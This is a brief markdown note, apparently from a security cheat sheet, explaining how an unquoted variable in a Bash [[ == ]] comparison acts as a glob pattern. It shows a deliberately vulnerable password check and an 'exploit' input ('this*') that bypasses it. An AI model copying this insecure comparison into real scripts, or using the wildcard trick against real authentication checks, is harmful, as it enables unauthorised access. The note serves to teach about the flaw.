## Bash Escape / Exploit

### Summary
- Bash Comparison

### Bash Comparison
- **=** and **==** are for string comparisons
- **-eq** are for numeric comparisons\
**Vulnerable Code**
``` bash
DB_PASS="thisisdbpass"; => Just for example, it's should be REDACTED
USER_PASS="i_dont_know_what_is_db_pass"

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi
```
The result of that will be "Failed" because DB_PASS and USER_PASS does not match!\
**Exploit**
``` bash
DB_PASS="thisisdbpass"; => Just for example, it's should be REDACTED
USER_PASS="this*" => asterisk character (*) it acts as a wildcard and matches any part of the string.

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi
```